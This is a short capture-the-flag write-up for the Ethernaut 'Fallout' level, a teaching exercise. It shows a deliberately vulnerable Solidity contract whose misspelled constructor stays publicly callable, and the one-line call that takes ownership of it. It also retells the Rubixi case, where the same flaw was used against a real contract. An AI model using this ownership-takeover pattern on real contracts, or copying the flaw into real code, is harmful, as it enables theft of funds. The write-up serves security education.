## Ethernaut Level 02 - Fallout - Write-Up
<!--Authors: OofedUp-->

Difficulty: 2/10

![image](https://i.imgur.com/qXzF4vf.png)

## Source
```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

At first, the contract seems secure, but if you take a closer look you will find something really interesting here:

```javascript
/* constructor */
 function Fal1out() public payable {
   owner = msg.sender;
   allocations[owner] = msg.value;
 }
```

The *constructor* function was defined with a typo (**1** instead of **l**), so the contract's owner was not set on deployment, but more importantly, the function is public and callable. We can use it to become the owner:

```javascript
contract.Fal1out()
```

We can then submit it.

![image](https://i.imgur.com/G5KJZ3n.png)

## Note

That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?
Well... Not quite.
The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:
```javascript
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
```
This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
